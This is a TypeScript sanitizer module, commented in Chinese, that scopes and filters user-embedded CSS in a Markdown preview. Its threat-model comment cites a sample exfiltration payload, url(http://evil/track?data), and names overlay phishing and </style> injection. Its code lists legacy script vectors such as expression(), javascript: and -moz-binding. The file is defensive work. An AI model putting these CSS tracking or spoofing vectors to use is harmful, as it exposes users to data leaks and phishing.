// user-css.ts — 用户内嵌 HTML/CSS 的安全渲染层（v0.2.7）
//
// 功能定位：允许 Markdown 文档内嵌 <style> 块与 style 属性（内嵌 CSS 渲染），
// 同时保证用户 CSS 无法逃出预览区污染应用其余 UI（编辑器 / 侧栏 / 标题栏）。
//
// 威胁模型与对策：
//   1. UI 欺骗（钓鱼）：恶意文档用 position:fixed + 大 z-index 盖住整个应用
//      伪造界面 → 声明黑名单直接丢弃 position:fixed/absolute/sticky、
//      z-index、top/right/bottom/left/inset；
//      作用域前缀保证选择器只能命中 .preview-content 子树。
//   2. 外发跟踪 / 内网探测：background-image:url(http://evil/track?data)、
//      @import 远程样式 → url() 仅允许 #（SVG 引用）与 data:（内联字体图），
//      含 "//" 的值一律丢弃（覆盖 url()/image-set()/src() 等所有加载函数）。
//   3. HTML 注入逃逸：CSS 字符串里塞 "</style>" 提前闭合 style 元素注入
//      任意 HTML → buildUserStyleTag 输出前转义 </style。
//   4. 旧 IE 向量：expression() / behavior / -moz-binding → 值黑名单丢弃。
//   5. <style> 块整体不经过 DOMPurify（其 FORBID_TAGS 会剥掉），而是先
//      extractStyleBlocks 提取 → scopeUserCss 重写为作用域 CSS → 由渲染
//      管线以 <style data-user-css> 拼回输出。重写器输出只含「声明过滤后」
//      的内容，不再有原始用户 HTML。
//
// 已知限制（文档化，非缺陷）：
//   - 不支持 CSS Nesting（嵌套规则块整块丢弃）；
//   - @import / @charset / @namespace / @layer 一律丢弃；
//   - font-family 的远程字体 url() 不可用，远程字体请用 data: 内联。

/** 作用域前缀：与 index.html 预览容器内包裹层 class 一致 */
export const SCOPE_PREFIX = ".preview-content";

// ============================================================================
// 声明级过滤（style 属性与 <style> 块共用同一套规则）
// ============================================================================

/** 直接禁止的属性名（prop 已小写）。position 单独按值判定，不在列 */
const FORBID_PROPS =
    /^(?:z-index|top|right|bottom|left|inset(?:-block|-inline)?|behavior|-moz-binding)$/;

/**
 * 过滤一组 CSS 声明（分号分隔），返回保留的声明数组。
 * 输入可以是 style 属性值，也可以是规则块内部的声明列表。
 */
export function filterDeclarations(text: string): string[] {
    const out: string[] = [];
    for (const raw of splitTopLevel(text, ";")) {
        const decl = raw.trim();
        if (!decl) continue;
        // 嵌套规则残块 / 花括号：不支持 CSS Nesting，整段丢弃（保安全）
        if (/[{}]/.test(decl)) continue;
        const ci = decl.indexOf(":");
        if (ci <= 0) continue; // 无冒号或空属性名
        const prop = decl.slice(0, ci).trim().toLowerCase();
        const value = decl.slice(ci + 1).trim();
        if (!prop || !value) continue;
        if (FORBID_PROPS.test(prop)) continue;
        if (prop === "position" && !/^(?:relative|static)$/i.test(value)) continue;
        if (!isSafeDeclValue(value)) continue;
        out.push(`${prop}: ${value}`);
    }
    return out;
}

/** style 属性值过滤入口（DOMPurify hook 调用） */
export function filterInlineStyle(css: string): string {
    return filterDeclarations(css).join("; ");
}

/**
 * 声明值安全性检查：
 *  - 含 "//"：任何 URL 形态（url() / image-set() / src() / file:…）→ 拒
 *    （CSS 声明值中 "//" 只会出现在待加载资源的字符串里，误伤面仅限
 *     content:"a//b" 这类纯文本，安全优先）
 *  - expression / behavior / -moz-binding / javascript: / vbscript: → 拒
 *  - url(...) 仅允许 #（本地 SVG 引用）与 data:（内联资源）
 */
function isSafeDeclValue(value: string): boolean {
    const lower = value.toLowerCase();
    if (lower.includes("//")) return false;
    if (/(expression\s*\(|javascript:|vbscript:|behavior\s*:|-moz-binding)/.test(lower)) return false;
    const urlRe = /url\(\s*(['"]?)([^'")]*)\1\s*\)/g;
    for (const m of lower.matchAll(urlRe)) {
        const u = (m[2] || "").trim();
        if (u && !u.startsWith("#") && !u.startsWith("data:")) return false;
    }
    return true;
}

// ============================================================================
// 括号 / 字符串感知的顶层分割（`;` 分声明、`,` 分选择器共用）
// ============================================================================

function splitTopLevel(text: string, sep: string): string[] {
    const parts: string[] = [];
    let depth = 0;
    let cur = "";
    let i = 0;
    while (i < text.length) {
        const c = text[i];
        if (c === '"' || c === "'") {
            // 原样带走整个字符串字面量（含引号与转义）。
            // 注意：必须用手动 while 管理游标——for+continue 会在 continue 时
            // 触发 i++，把紧随闭引号的 ]/; 等分隔符吞掉（单元测试已锁死）
            const q = c;
            cur += c;
            i++;
            while (i < text.length) {
                if (text[i] === "\\") { cur += text.slice(i, i + 2); i += 2; continue; }
                cur += text[i];
                i++;
                if (text[i - 1] === q) break;
            }
            continue;
        }
        if (c === "(") depth++;
        else if (c === ")") depth = Math.max(0, depth - 1);
        if (c === sep && depth === 0) { parts.push(cur); cur = ""; i++; continue; }
        cur += c;
        i++;
    }
    parts.push(cur);
    return parts;
}

// ============================================================================
// <style> 块提取
// ============================================================================

const STYLE_BLOCK_RE = /<style\b[^>]*>([\s\S]*?)<\/style>/gi;

/**
 * 从 marked 输出的 HTML 中摘除所有 <style> 块。
 * 返回去掉 style 的 HTML（交 DOMPurify 清洗）与合并的 CSS 源码。
 */
export function extractStyleBlocks(html: string): { html: string; css: string } {
    const blocks: string[] = [];
    const stripped = html.replace(STYLE_BLOCK_RE, (_m, body: string) => {
        blocks.push(body);
        return "";
    });
    return { html: stripped, css: blocks.join("\n") };
}

/**
 * 作用域化 CSS 并包装为安全的 <style> 标签。
 * 输出为空（无有效规则）时返回空串，渲染管线直接跳过拼接。
 */
export function buildUserStyleTag(css: string): string {
    const scoped = scopeUserCss(css);
    if (!scoped.trim()) return "";
    // 防 HTML 逃逸：CSS 字符串内的 </style> 会被 HTML 解析器当作闭合标签，
    // 转义为 <\/style（CSS 中 \/ 与 / 等价，浏览器行为一致）
    const safe = scoped.replace(/<\/(style)/gi, "<\\/$1");
    return `<style data-user-css="1">\n${safe}\n</style>`;
}

// ============================================================================
// CSS 重写器：选择器前缀化 + at-rule 分支
// ============================================================================

type Ctx = "top" | "cond" | "keyframes";

/**
 * 把用户 CSS 的每个选择器限定在预览区作用域内。
 * 支持：普通规则、@media / @supports / @container 递归、
 * @keyframes（内部选择器不前缀）、@font-face 等声明型 at-rule（仅过滤声明）、
 * html / body / :root 开头的选择器映射到预览容器自身。
 * @import 等无块 at-rule、嵌套规则块（Nesting）一律丢弃。
 */
export function scopeUserCss(input: string): string {
    return rewrite(input, "top");

    function rewrite(text: string, ctx: Ctx): string {
        const out: string[] = [];
        let i = 0;
        const n = text.length;

        const skipWsComments = () => {
            for (;;) {
                while (i < n && /\s/.test(text[i])) i++;
                if (i + 1 < n && text[i] === "/" && text[i + 1] === "*") {
                    const e = text.indexOf("*/", i + 2);
                    i = e < 0 ? n : e + 2;
                    continue;
                }
                return;
            }
        };
        const skipString = () => { // text[i] 是引号
            const q = text[i];
            i++;
            while (i < n) {
                if (text[i] === "\\") { i += 2; continue; }
                if (text[i] === q) { i++; return; }
                i++;
            }
        };

        // i 停在 '{'：读完整花括号块，返回内部内容，i 越过 '}'
        const readBraceBlock = (): string => {
            i++; // {
            let depth = 1;
            const start = i;
            while (i < n && depth > 0) {
                const c = text[i];
                if (c === '"' || c === "'") { skipString(); continue; }
                if (c === "/" && text[i + 1] === "*") { skipWsComments(); continue; }
                if (c === "{") depth++;
                else if (c === "}") depth--;
                if (depth > 0) i++;
            }
            const inner = text.slice(start, i);
            i++; // 越过 }
            return inner;
        };

        const emitDecls = (body: string, head: string) => {
            const kept = filterDeclarations(body);
            if (kept.length) out.push(`${head} { ${kept.join("; ")} }`);
        };

        while (i < n) {
            skipWsComments();
            if (i >= n) break;

            if (text[i] === "@") {
                // 读 at-rule 头部（到 '{' 或 ';'）
                const hStart = i;
                while (i < n && text[i] !== "{" && text[i] !== ";") {
                    if (text[i] === '"' || text[i] === "'") { skipString(); continue; }
                    if (text[i] === "/" && text[i + 1] === "*") { skipWsComments(); continue; }
                    i++;
                }
                const header = text.slice(hStart, i).trim();
                if (text[i] === ";") { i++; continue; } // 无块 at-rule：@import 等一律丢弃
                if (i >= n) break;
                const inner = readBraceBlock();
                const atName = (header.match(/^@([-\w]+)/) || [])[1]?.toLowerCase() ?? "";
                if (atName === "media" || atName === "supports" || atName === "container") {
                    out.push(`${header} { ${rewrite(inner, "cond")} }`);
                } else if (atName === "keyframes" || atName === "-webkit-keyframes") {
                    out.push(`${header} { ${rewrite(inner, "keyframes")} }`);
                } else {
                    // @font-face / @property / @counter-style / @page 等声明型：
                    // 结构保留，内部声明照常过滤（url() 白名单生效）
                    emitDecls(inner, header);
                }
                continue;
            }

            // 普通规则：读选择器到 '{'
            const selStart = i;
            while (i < n && text[i] !== "{") {
                if (text[i] === '"' || text[i] === "'") { skipString(); continue; }
                if (text[i] === "/" && text[i + 1] === "*") { skipWsComments(); continue; }
                i++;
            }
            if (i >= n) break; // 尾部残片（无块）丢弃
            const selectors = text.slice(selStart, i);
            const inner = readBraceBlock();
            const head = ctx === "keyframes" ? selectors.trim() : prefixSelectors(selectors);
            if (!head) continue;
            emitDecls(inner, head);
        }
        return out.join("\n");
    }
}

/** 逗号分割选择器列表（:not(a,b) 内逗号不分割）后逐个加前缀 */
function prefixSelectors(selectors: string): string {
    const parts = splitTopLevel(selectors, ",")
        .map((s) => prefixSelector(s.trim()))
        .filter(Boolean);
    return parts.join(", ");
}

/**
 * 单个选择器前缀化：
 *  - 开头连续的 html / body / :root（含其间的 > 组合符）→ 替换为前缀本体
 *    （「body p」意为「预览区内的 p」，映射成 ".preview-content p"）
 *  - 其余一律加后代前缀（含通配符）
 */
function prefixSelector(sel: string): string {
    let s = sel.trim();
    if (!s) return "";
    let replaced = false;
    for (;;) {
        const m = s.match(/^(?:html|body|:root)(?![\w-])/i);
        if (!m) break;
        s = s.slice(m[0].length).replace(/^[>\s]+/, "");
        replaced = true;
    }
    if (replaced) return s ? `${SCOPE_PREFIX} ${s}` : SCOPE_PREFIX;
    return `${SCOPE_PREFIX} ${s}`;
}
